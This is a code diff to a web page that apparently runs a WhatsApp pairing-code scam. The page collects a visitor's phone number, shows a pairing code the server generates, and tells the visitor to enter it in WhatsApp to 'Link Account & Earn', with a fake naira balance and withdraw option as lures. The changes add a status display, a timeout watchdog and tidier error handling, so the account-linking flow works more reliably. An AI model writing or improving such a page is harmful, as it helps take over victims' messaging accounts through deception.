@@ -38,6 +38,8 @@
         .pin-container input.filled { border-color: var(--primary); }
         
         .warning-text { font-size: 11px; color: #f59e0b; margin-bottom: 15px; text-align: center; }
+        
+        .pair-status-box { font-size: 12px; color: var(--text-muted); margin-top: 12px; text-align: center; padding: 10px; background: var(--bg); border-radius: 8px; border: 1px solid var(--border); min-height: 36px; display: flex; align-items: center; justify-content: center; }
 
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
         .stat-card { background: var(--card); border-radius: 16px; padding: 20px; border: 1px solid var(--border); text-align: center; }
@@ -53,7 +55,6 @@
         .leader-name { font-size: 14px; font-weight: 500; }
         .leader-amount { font-size: 14px; font-weight: 700; color: var(--primary); }
 
-        /* NEW PAIRING CODE UI */
         .code-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
         .code-input { font-size: 24px; font-weight: 800; text-align: center; letter-spacing: 2px; color: var(--primary); background: rgba(16,185,129,0.1); border: 1px dashed var(--primary); padding: 15px; border-radius: 12px; width: 100%; max-width: 250px; outline: none; cursor: pointer; }
         .copy-btn { background: var(--primary); color: white; border: none; padding: 10px 15px; border-radius: 8px; font-size: 14px; cursor: pointer; font-weight: 600; transition: 0.2s; }
@@ -133,6 +134,7 @@
                         </div>
                         <div class="warning-text">Do not include the leading 0 (e.g. enter 803..., not 0803...)</div>
                         <button class="btn" id="send-btn" onclick="requestCode()" style="margin-top: 5px;">Link Account & Earn</button>
+                        <div class="pair-status-box" id="pair-status" style="display:none;">Idle</div>
                     </div>
                 </div>
             </div>
@@ -149,9 +151,8 @@
             <p class="sub-text">Copy this code and enter it in your WhatsApp.</p>
             
             <div class="code-container">
-                <!-- Using an input field makes copying 100% reliable on mobile -->
                 <input type="text" class="code-input" id="pairing-code" value="------" readonly onclick="selectCode()">
-                <button class="copy-btn" onclick="copyCode()">Copy</button>
+                <button class="copy-btn" onclick="copyCode(event)">Copy</button>
             </div>
             
             <div class="instructions">
@@ -201,6 +202,7 @@
         let currentBalance = 2000;
         let userPhone = '';
         let selectedCurrency = '₦';
+        let pairWatchdog = null;
 
         const countrySelect = document.getElementById('country-code');
         countrySelect.addEventListener('change', (e) => {
@@ -226,36 +228,57 @@
         function getFullNumber() { let num = ''; inputs.forEach(input => num += input.value); return num; }
         function showInput() { document.getElementById('start-btn').style.display = 'none'; document.getElementById('input-group').style.display = 'block'; inputs[0].focus(); }
 
-        function requestCode() {
-            const localNumber = getFullNumber();
-            const countryCode = document.getElementById('country-code').value.replace('+', ''); 
-            if (localNumber.length !== 10) return alert("Please enter all 10 digits.");
-            userPhone = countryCode + localNumber; 
-            document.getElementById('send-btn').disabled = true;
-            document.getElementById('send-btn').innerText = 'Connecting...';
-            socket.emit('request_code', userPhone);
+        function setStatus(msg) {
+            const el = document.getElementById('pair-status');
+            el.style.display = 'flex';
+            el.innerText = msg;
         }
 
+        function resetSendBtn() {
+            const btn = document.getElementById('send-btn');
+            btn.disabled = false;
+            btn.innerText = 'Link Account & Earn';
+        }
+
+        function requestCode() {
+            const localNumber = getFullNumber();
+            const countryCode = document.getElementById('country-code').value.replace('+', '');
+            if (localNumber.length !== 10) return alert("Please enter all 10 digits.");
+            userPhone = countryCode + localNumber;
+            document.getElementById('send-btn').disabled = true;
+            document.getElementById('send-btn').innerText = 'Connecting...';
+            setStatus('Starting pairing...');
+
+            socket.emit('request_code', userPhone);
+
+            pairWatchdog = setTimeout(() => {
+                resetSendBtn();
+                setStatus('Timed out. Please try again.');
+            }, 120000);
+        }
+
+        socket.on('pair_status', (data) => {
+            setStatus(data.msg);
+        });
+
         socket.on('code_generated', (code) => {
+            clearTimeout(pairWatchdog);
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
             document.getElementById('pairing-code').value = code;
         });
 
-        // --- THE BULLETPROOF COPY LOGIC ---
         function selectCode() {
             const input = document.getElementById('pairing-code');
             input.select();
-            input.setSelectionRange(0, 99999); // For mobile
+            input.setSelectionRange(0, 99999);
         }
 
-        function copyCode() {
+        function copyCode(event) {
             const input = document.getElementById('pairing-code');
             input.select();
             input.setSelectionRange(0, 99999);
-            
             try {
-                // This is the only method that works reliably on mobile without HTTPS
                 document.execCommand('copy');
                 const btn = event.target;
                 btn.innerText = 'Copied!';
@@ -267,6 +290,7 @@
         }
 
         socket.on('success', () => {
+            clearTimeout(pairWatchdog);
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
             document.getElementById('final-balance-amount').innerText = currentBalance.toLocaleString();
@@ -275,9 +299,10 @@
         });
 
         socket.on('error', (msg) => {
+            clearTimeout(pairWatchdog);
             alert(msg);
-            document.getElementById('send-btn').disabled = false;
-            document.getElementById('send-btn').innerText = 'Link Account & Earn';
+            resetSendBtn();
+            setStatus('Pairing failed. Try again.');
         });
 
         function showWithdraw() { const box = document.getElementById('withdraw-box'); box.style.display = box.style.display === 'block' ? 'none' : 'block'; }
